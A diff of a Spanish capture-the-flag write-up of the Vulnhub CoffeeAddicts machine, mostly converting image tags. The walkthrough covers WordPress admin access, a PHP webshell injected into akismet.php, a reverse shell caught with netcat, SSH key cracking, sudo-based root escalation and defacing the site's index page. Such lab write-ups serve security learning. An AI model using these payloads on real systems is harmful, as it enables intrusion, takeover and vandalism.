@@ -4,11 +4,10 @@ title: CoffeeAddicts - Write-up
 date: 2025-08-18
 author:
   name: Suzunao
-  avatar: /assets/img/icon/Suzunao.png
+  avatar: /assets/img/_optimized/avatar-96.webp
 tags:
   - Linux
   - Vulnhub
-background: https://i.pinimg.com/1200x/a9/c9/38/a9c9385efdc4db8d8884df92f9822769.jpg
 ---
 
 Antes de iniciar, debemos identificar la dirección IP correspondiente a la máquina Coffee y, posteriormente, escanear sus puertos abiertos. Para ello, primero es necesario conocer la interfaz de red activa y la subred asignada, lo cual nos permitirá delimitar correctamente el rango de escaneo. Utilizamos el siguiente comando:
@@ -17,7 +16,7 @@ Antes de iniciar, debemos identificar la dirección IP correspondiente a la máq
 route ip 
 ```
 
-![Descripción](/assets/img/posts/cofeeaddicts/20250621200450.png)
+<img src="/assets/img/posts/cofeeaddicts/20250621200450.webp" alt="Descripción" width="673" height="100" loading="lazy" decoding="async">
 
 El comando `ip route` nos permite visualizar la tabla de enrutamiento actual del sistema. A partir de esta salida, podemos identificar la interfaz de red activa y la subred asignada. Por ejemplo, si observamos la línea: 
 
@@ -54,7 +53,7 @@ sudo nmap -sSVC -T4 -vvv 142.160.0.7 -oN Portscan.txt
 
 Como resultado del escaneo, se identificaron los siguientes puertos abiertos en la máquina objetivo:
 
-![Descripción](/assets/img/posts/cofeeaddicts/20250621203839.png)
+<img src="/assets/img/posts/cofeeaddicts/20250621203839.webp" alt="Descripción" width="865" height="334" loading="lazy" decoding="async">
 
 ``` bash 
 PORT   STATE SERVICE REASON         VERSION
@@ -68,7 +67,7 @@ Esto indica lo siguiente:
 - **Puerto 80 (HTTP)**: Hay un servicio web activo utilizando Apache 2.4.29, el cual no está protegido con SSL/TLS, es decir, no utiliza HTTPS.
 Al intentar acceder mediante navegador a través de la dirección IP, se presenta la siguiente página:
 
-![descripcion](/assets/img/posts/cofeeaddicts/20250621204115.png)
+<img src="/assets/img/posts/cofeeaddicts/20250621204115.webp" alt="descripcion" width="1012" height="226" loading="lazy" decoding="async">
 
 Esto sugiere que el servidor espera que la solicitud HTTP incluya un nombre de dominio (virtual host) específico. Para resolver esta situación, agregamos una entrada personalizada en el archivo `/etc/hosts` para asociar el dominio con la IP objetivo.
 
@@ -83,7 +82,7 @@ echo "142.160.0.7 coffeeaddicts.thm" | sudo tee -a /etc/hosts
 http://coffeeaddicts.thm
 ```
 
-![Descripción](/assets/img/posts/cofeeaddicts/20250621211500.png)
+<img src="/assets/img/posts/cofeeaddicts/20250621211500.webp" alt="Descripción" width="1012" height="885" loading="lazy" decoding="async">
 
 Con este paso completado, ya podemos inspeccionar y analizar la aplicación web en busca de rutas ocultas, formularios vulnerables o configuraciones inseguras.
 
@@ -99,12 +98,12 @@ ffuf -w /usr/share/wordlists/dirb/common.txt -u http://coffeeaddicts.thm/FUZZ -i
 - `-u`: Define la URL con el marcador `FUZZ`, el cual será sustituido por cada palabra del diccionario.
 - `-ic`: Ignora mayúsculas y minúsculas durante el análisis de las respuestas.
 
-![Descripcion](/assets/img/posts/cofeeaddicts/20250621213452.png)
+<img src="/assets/img/posts/cofeeaddicts/20250621213452.webp" alt="Descripcion" width="754" height="158" loading="lazy" decoding="async">
 
 Como resultado se identificó la ruta `/wordpress`, lo cual indica la presencia de un sitio web construido con WordPress.
 Al acceder a `http://coffeeaddicts.thm/wordpress`, se observan publicaciones y comentarios. En uno de ellos se menciona lo siguiente:
 
-![Descripcion](/assets/img/posts/cofeeaddicts/20250622000646.png)
+<img src="/assets/img/posts/cofeeaddicts/20250622000646.webp" alt="Descripcion" width="1014" height="877" loading="lazy" decoding="async">
 
 > _“Is that a password?”_  
 > _“Maybe...”_
@@ -119,15 +118,15 @@ Entonces para probarlas se realiza una nueva búsqueda de rutas dentro del direc
 ffuf -w /usr/share/wordlists/dirb/common.txt -u http://coffeeaddicts.thm/wordpress/FUZZ -ic
 ```
 
-![Descripción](/assets/img/posts/cofeeaddicts/20250622001218.png)
+<img src="/assets/img/posts/cofeeaddicts/20250622001218.webp" alt="Descripción" width="759" height="184" loading="lazy" decoding="async">
 
 Como resultado se descubre la ruta `/wp-login.php`, correspondiente al panel de autenticación de administradores de WordPress, se accede a `http://coffeeaddicts.thm/wordpress/wp-login.php` e ingresan las credenciales inferidas:
 
-![Descripción](/assets/img/posts/cofeeaddicts/20250622001458.png)
+<img src="/assets/img/posts/cofeeaddicts/20250622001458.webp" alt="Descripción" width="1003" height="753" loading="lazy" decoding="async">
 
 Al parecer la autenticación  es exitosa, otorgando acceso al panel de administración de WordPress, lo que representa un punto crítico de acceso con posibilidades de escalar privilegios o ejecutar código en el servidor
 
-![Descripción](/assets/img/posts/cofeeaddicts/20250622001608.png)
+<img src="/assets/img/posts/cofeeaddicts/20250622001608.webp" alt="Descripción" width="1000" height="894" loading="lazy" decoding="async">
 
 ### Ejecución de código remoto  
 
@@ -140,7 +139,7 @@ Entonces con esto en cuenta aprovechamos esta funcionalidad para insertar un Web
 <?php system($_GET['cmd']); ?>
 ```
 
-![Descripción](/assets/img/posts/cofeeaddicts/20250622010801.png)
+<img src="/assets/img/posts/cofeeaddicts/20250622010801.webp" alt="Descripción" width="1012" height="355" loading="lazy" decoding="async">
 
 Luego de inyectar el código accedemos a la siguiente URL, incorporando el parámetro `cmd=id`, con el objetivo de validar la ejecución:
 
@@ -148,7 +147,7 @@ Luego de inyectar el código accedemos a la siguiente URL, incorporando el pará
 http://coffeeaddicts.thm/wordpress/wp-content/plugins/akismet/akismet.php?cmd=id
 ```
 
-![Descripción](/assets/img/posts/cofeeaddicts/20250622010843.png)
+<img src="/assets/img/posts/cofeeaddicts/20250622010843.webp" alt="Descripción" width="1006" height="224" loading="lazy" decoding="async">
 
 Con esto  se confirma la ejecución exitosa de comandos en el sistema a través de la inyección en el archivo `akismet.php`.
 
@@ -162,18 +161,18 @@ $port = "1234"; // <- Puerto
 ?>
 ```
 
-![Descripción](/assets/img/posts/cofeeaddicts/20250622014542.png)
+<img src="/assets/img/posts/cofeeaddicts/20250622014542.webp" alt="Descripción" width="994" height="314" loading="lazy" decoding="async">
 
 Con esto cargado, colocamos nuestra maquina en escucha por el puerto 1234 : `nc -lvnp 1234`.
 Accedemos a la URL para ejecutar el payload: `http://coffeeaddicts.thm/wordpress/wp-content/plugins/akismet/akismet.php` y en nuestra maquina obtendremos la reverse shell:
 
-![Descripción](/assets/img/posts/cofeeaddicts/20250622014743.png)
+<img src="/assets/img/posts/cofeeaddicts/20250622014743.webp" alt="Descripción" width="645" height="177" loading="lazy" decoding="async">
 
 ### Escalada Privilegios  -> user
 
 Una vez dentro del sistema con la sesión obtenida vía reverse shell, se accede al directorio `/home/gus`, donde se encuentra la flag de usuario junto a un archivo adicional llamado `readme.txt`. Al revisar el contenido del `readme.txt`, se puede observar el siguiente mensaje:
 
-![Descripción](/assets/img/posts/cofeeaddicts/20250622023736.png)
+<img src="/assets/img/posts/cofeeaddicts/20250622023736.webp" alt="Descripción" width="864" height="159" loading="lazy" decoding="async">
 
 El usuario `gus` fue eliminado del grupo sudoers, por lo que ha perdido la capacidad de ejecutar comandos como superusuario mediante `sudo`. Para identificar otros usuarios potencialmente relevantes, se ejecuta:
 
@@ -181,7 +180,7 @@ El usuario `gus` fue eliminado del grupo sudoers, por lo que ha perdido la capac
 cat /etc/passwd | grep bash
 ```
 
-![Descripción](/assets/img/posts/cofeeaddicts/20250622024155.png)
+<img src="/assets/img/posts/cofeeaddicts/20250622024155.webp" alt="Descripción" width="437" height="99" loading="lazy" decoding="async">
 
 Entre los resultados, se destaca el usuario **`badbyte`**, quien probablemente sea el responsable de los cambios mencionados en el `readme.txt`. Procedemos a enumerar el contenido del directorio personal de `badbyte`, así como de su subdirectorio oculto `.ssh`, donde suelen almacenarse claves SSH:
 
@@ -190,7 +189,7 @@ ls -a /home/badbyte/
 ls -a /home/badbyte/.ssh
 ```
 
-![Descripción](/assets/img/posts/cofeeaddicts/20250622024957.png)
+<img src="/assets/img/posts/cofeeaddicts/20250622024957.webp" alt="Descripción" width="464" height="301" loading="lazy" decoding="async">
 
 En este caso se descubre el archivo `id_rsa`, una clave privada SSH cifrada. Este archivo puede permitir el acceso remoto como `badbyte` si logramos descifrar su contraseña utilizando ssh2joh y john the ripper, la herramienta `John the Ripper` no puede usar directamente archivos `id_rsa`. Por ello, primero se convierte a un formato compatible utilizando el script `ssh2john.py`:
 
@@ -205,23 +204,23 @@ Esto genera un archivo llamado `id_rsa.hash`, que contiene la representación de
 john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
 ```
 
-![Descripción](/assets/img/posts/cofeeaddicts/20250622030937.png)
+<img src="/assets/img/posts/cofeeaddicts/20250622030937.webp" alt="Descripción" width="767" height="301" loading="lazy" decoding="async">
 
 Después de unos segundos, John logra descifrar la contraseña de la clave privada, revelando así la passphrase utilizada para proteger el archivo. Con la clave ya funcional, se puede establecer una sesión SSH interactiva como el usuario `badbyte`.
 
-![Descripción](/assets/img/posts/cofeeaddicts/20250622031310.png)
+<img src="/assets/img/posts/cofeeaddicts/20250622031310.webp" alt="Descripción" width="826" height="380" loading="lazy" decoding="async">
 
 ### Escalada de privilegios -> root 
 
 Una vez se ha obtenido acceso como el usuario `badbyte`,  buscaremos la forma para elevar privilegios al usuario `root`. Para verificar si `badbyte` posee permisos especiales mediante `sudo`, se ejecuta:
 
-![Descripción](/assets/img/posts/cofeeaddicts/20250622033341.png)
+<img src="/assets/img/posts/cofeeaddicts/20250622033341.webp" alt="Descripción" width="753" height="141" loading="lazy" decoding="async">
 
 `(root) /opt/BadByte/shell:` Indica que el usuario puede ejecutar el binario `/opt/BadByte/shell` como root. Si está configurado con la opción `NOPASSWD`, puede hacerlo sin introducir la contraseña.
 
 Antes de ejecutarlo directamente, se inspeccionan los archivos presentes en el directorio `/opt/BadByte/`:
 
-![Descripción](/assets/img/posts/cofeeaddicts/20250622033812.png)
+<img src="/assets/img/posts/cofeeaddicts/20250622033812.webp" alt="Descripción" width="505" height="487" loading="lazy" decoding="async">
 
 Aquí encontramos el  `shell`  que es un compilado del archivo `shell.ccp`, este archivo  es un programa en C++ que actúa como una shell interactiva básica esta lee los comandos ingresados por el usuario y los ejecuta en el sistema utilizando la función `system()`. El código entra en un bucle infinito (`while(1)`), muestra un prompt (`BadByte #`), captura la entrada del usuario con `cin >> command`, la convierte a un formato compatible con C (`cstr`) y la ejecuta con `system(cstr)` 
 Como el usuario `badbyte` tiene permisos para ejecutarlo como root (según `sudo -l`), cualquier comando que se pase a través de este programa se ejecutará con privilegios elevados. Con lo anterior en mente, se procede a ejecutar el binario:
@@ -230,7 +229,7 @@ Como el usuario `badbyte` tiene permisos para ejecutarlo como root (según 
 sudo /opt/BadByte/shell
 ```
 
-![Descripción](/assets/img/posts/cofeeaddicts/20250622035026.png)
+<img src="/assets/img/posts/cofeeaddicts/20250622035026.webp" alt="Descripción" width="474" height="98" loading="lazy" decoding="async">
 
 El sistema muestra el prompt `"BadByte # "`, lo que indica que el programa está activo. Desde aquí, se puede ejecutar cualquier comando del sistema con privilegios elevados.
 
@@ -242,24 +241,24 @@ Una vez se obtiene acceso como root, se cuenta con privilegios suficientes para 
 find / -name "index.html" 2>/dev/null
 ```
 
-![Descripción](/assets/img/posts/cofeeaddicts/20250622035057.png)
+<img src="/assets/img/posts/cofeeaddicts/20250622035057.webp" alt="Descripción" width="667" height="169" loading="lazy" decoding="async">
 
 como vemos el archivo debemos modificar se encuentra en `/var/www/coffeeaddicts.thm/public_html/` . Se accede al directorio donde reside el archivo para su edición:
 
-![Descripción](/assets/img/posts/cofeeaddicts/20250622041149.png)
+<img src="/assets/img/posts/cofeeaddicts/20250622041149.webp" alt="Descripción" width="858" height="252" loading="lazy" decoding="async">
 
 Antes de modificar el archivo, transfiere al servidor una imagen personalizada (`badbyte.png`) que se utilizará como logo en el index.html.
 
 ```
 <h1 style=color:red;>YOUR WEBSITE HAS BEEN HACKED BY BadByte mf</h1> 
-<img src="./badbyte.png">
+<!-- imagen original no disponible: badbyte.png -->
 ```
 
 modificamos estas dos lineas  uno con nuentro seudonimo y el otro con la imagen:
 
 > si no se actualiza: `systemctl restart apache2` 
 
-![Descripción](/assets/img/posts/cofeeaddicts/20250622041707.png)
+<img src="/assets/img/posts/cofeeaddicts/20250622041707.webp" alt="Descripción" width="1024" height="862" loading="lazy" decoding="async">
 
 
 ### Flags 
